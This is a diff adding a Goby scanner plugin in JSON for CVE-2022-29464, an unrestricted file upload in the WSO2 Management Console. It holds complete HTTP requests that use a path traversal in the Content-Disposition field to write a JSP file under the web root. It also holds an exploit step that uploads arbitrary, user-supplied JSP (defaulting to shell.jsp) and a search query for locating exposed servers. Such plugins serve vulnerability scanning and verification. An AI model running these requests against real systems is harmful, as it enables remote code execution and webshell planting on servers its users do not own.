@@ -1,0 +1,157 @@
+{
+      "Name": "WSO2 Management Console Unrestricted Arbitrary File Upload RCE CVE-2022-29464",
+      "Level": "3",
+      "Tags": [
+            "fileupload",
+            "rce"
+      ],
+      "GobyQuery": "app=\"wso2-carbon-server\" || product=\"WSO2-Carbon-Server\" || company=\"WSO2\" || title=\"WSO2\"",
+      "Description": "WSO2 Identity Server is an open source Identity Management and Entitlement Server which is based on identity and security standards and specifications.",
+      "Product": "WSO2 Management Console",
+      "Homepage": "https://wso2.com/",
+      "Author": "",
+      "Impact": "Certain WSO2 products allow unrestricted file upload with resultant remote code execution. The attacker must use a /fileupload endpoint with a Content-Disposition directory traversal sequence to reach a directory under the web root, such as a ../../../../repository/deployment/server/webapps directory. This affects WSO2 API Manager 2.2.0 and above through 4.0.0; WSO2 Identity Server 5.2.0 and above through 5.11.0; WSO2 Identity Server Analytics 5.4.0, 5.4.1, 5.5.0, and 5.6.0; WSO2 Identity Server as Key Manager 5.3.0 and above through 5.10.0; and WSO2 Enterprise Integrator 6.2.0 and above through 6.6.0.",
+      "Recommendation": "https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2021-1738",
+      "References": [
+            "https://nvd.nist.gov/vuln/detail/CVE-2022-29464",
+            "https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2021-1738"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "Filename",
+                  "Type": "input",
+                  "Value": "shell.jsp"
+            },
+            {
+                  "Name": "Textarea",
+                  "Type": "textarea",
+                  "Value": "WSO2-RCE-CVE-2022-29464"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/fileupload/toolsAny",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "multipart/form-data; boundary=---------------------------250033711231076532771336998311"
+                        },
+                        "data_type": "text",
+                        "data": "-----------------------------250033711231076532771336998311\r\nContent-Disposition: form-data; name=\"../../../../repository/deployment/server/webapps/authenticationendpoint/vuln.jsp\";filename=\"test.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n<% out.print(\"WSO2-RCE-CVE-2022-29464\"); %>\r\n-----------------------------250033711231076532771336998311--",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/authenticationendpoint/vuln.jsp",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "WSO2-RCE-CVE-2022-29464",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/fileupload/toolsAny",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "multipart/form-data; boundary=---------------------------250033711231076532771336998311"
+                        },
+                        "data_type": "text",
+                        "data": "-----------------------------250033711231076532771336998311\r\nContent-Disposition: form-data; name=\"../../../../repository/deployment/server/webapps/authenticationendpoint/{{{Filename}}}\";filename=\"test.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n{{{Textarea}}}\r\n-----------------------------250033711231076532771336998311--",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/authenticationendpoint/{{{Filename}}}",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|concat|"
+                  ]
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
